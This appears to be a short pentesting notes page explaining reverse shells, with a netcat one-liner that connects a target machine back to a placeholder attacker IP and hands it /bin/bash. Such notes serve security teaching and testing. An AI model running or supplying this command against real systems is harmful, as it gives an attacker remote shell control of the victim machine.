# Reverse Shell

Used to force the target machine to initiate a connection back to the attacker's machine thus creating a control channel that is often capable of skirting target-side firewall rules. From a target-side observer's perspective it would look like the target client initiated a connection to the attacker's server of its own volition thus making the attack look more like normal web traffic.

<figure><img src="../../.gitbook/assets/Netcat_ReverseShell.png" alt=""><figcaption><p>Netcat Reverse Shell Example</p></figcaption></figure>

## Netcat

### Basic Reverse Shell

#### Target Machine

The simplest command to spawn the shell is&#x20;

```shell
nc <ATTACKER-IP> <PORT> -e /bin/bash
```

The `-e /bin/bash` portion of the command instructs Netcat to pass any input from the user directly on to the program `/bin/bash`.

Often the machine will have the `-e` flag disabled thus preventing this straightforward method of shell creation.
